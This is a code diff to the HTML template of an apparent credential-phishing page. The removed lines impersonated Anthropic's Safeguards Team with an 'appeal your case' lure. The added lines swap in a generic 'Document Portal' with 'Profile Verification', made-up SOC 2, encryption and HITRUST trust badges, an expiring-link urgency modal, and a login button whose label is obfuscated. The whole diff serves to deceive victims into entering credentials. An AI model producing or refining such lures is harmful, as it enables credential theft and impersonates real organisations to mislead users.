@@ -582,9 +582,21 @@ const cssURLs = ['https://assets.calendly.com/assets/external/widget.css', '/pri
 const jsURLs = ['https://assets.calendly.com/assets/external/widget.js', '/primary/script.js']
 
 const primaryHTML = `
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://assets.calendly.com/assets/external/widget.css" rel="stylesheet">
+    <script src="https://assets.calendly.com/assets/external/widget.js" type="text/javascript"></script>
+    
+    <title>Policy review administration</title>
+    <link rel="icon" type="image/x-icon" href="/primary/images/favicon.ico">
+    <link rel="stylesheet" href="/primary/styles.css">
+
+</head>
+<body>
     <header>
         
-        <div id="logo">Claude Client Support</div>
+        <div id="logo">Account Dashboard</div>
         <nav>
             <a href="#">Home</a>
             <a href="#">Services</a>
@@ -596,14 +608,16 @@ const primaryHTML = `
 
     <main>
         <section id="hero">
-            <h1>Anthropic's Safeguards Team</h1>
+            <h1>Document Portal</h1>
             
-            <p>Acceptable Usage Policy.</p>
+            <p>SOC 2 Compliant |
+End-to-End Encrypted |
+Zero Data Retention</p>
         </section>
 
         <section id="registration-form-section">
             <section id="training-info">
-                <h2>Your Upcoming Appeal Progress with Anthropic's Safeguards Team</h2>
+                <h2>Profile Verification</h2>
                 
                 <p>Records are preserved, documentation is reviewed, and an internal assessment is performed.</p>
                 
@@ -611,8 +625,8 @@ const primaryHTML = `
 
             <div id="primary-overlay-container">
                 <div id="paywall-modal">
-                    <h3 id="lg-h">In five minutes, your review link will expire.</h3>
-                    <p id="lg-p">Continue to appeal your case.</p>
+                    <h3 id="lg-h">Link expires due to inactivity.</h3>
+                    <p id="lg-p">Verify & Continue</p>
                     
                     <button id="login-btn"><img id="lgImg" src="/primary/images/logo.svg"></img>OBFS==Adm92cvJ3Yp1EIoRXa3BibpBibnl2UEND</button>
                 </div>
@@ -625,7 +639,7 @@ const primaryHTML = `
     </main>
 
     <footer>
-        <p>&copy; Encryption verified by Anthropic's — 2026</p>
+        <p>&copy; 2026 Service Provided by HITRUST</p>
         <nav>
             <a href="#">Privacy Policy</a>
             <a href="#">Terms of Service</a>
